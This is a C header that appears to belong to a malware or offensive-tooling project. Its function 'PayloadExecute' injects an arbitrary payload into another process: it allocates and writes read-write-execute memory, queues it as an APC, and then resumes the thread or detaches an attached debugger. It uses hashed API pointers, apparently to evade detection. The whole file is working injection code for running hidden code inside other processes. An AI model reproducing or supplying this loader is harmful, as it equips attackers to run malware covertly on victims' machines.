# pragma once
#include "../UtilitySpells/ApiCtHash.h"
#include <stdio.h>
#include <Windows.h>

BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
    BOOL bDebuggerPresent = FALSE;
    SIZE_T		sNmbrOfBytesWritten = NULL;

    pAddress = pVirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!pVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!pWriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNmbrOfBytesWritten) || sPayloadSize != sNmbrOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", GetLastError(), (int)sNmbrOfBytesWritten, (int)sPayloadSize);
		return FALSE;
	}

	if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    
    if (CheckRemoteDebuggerPresent(hProcess, &bDebuggerPresent) && bDebuggerPresent) {
        if (!DebugActiveProcessStop(GetProcessId(hProcess))) {
            printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
            return FALSE;
        }}

    else {
        if(pResumeThread(hThread) == ((DWORD)-1)){
            printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
            return FALSE;
        }
    }

	if (phThread)
		*phThread = hThread;

	return TRUE;
}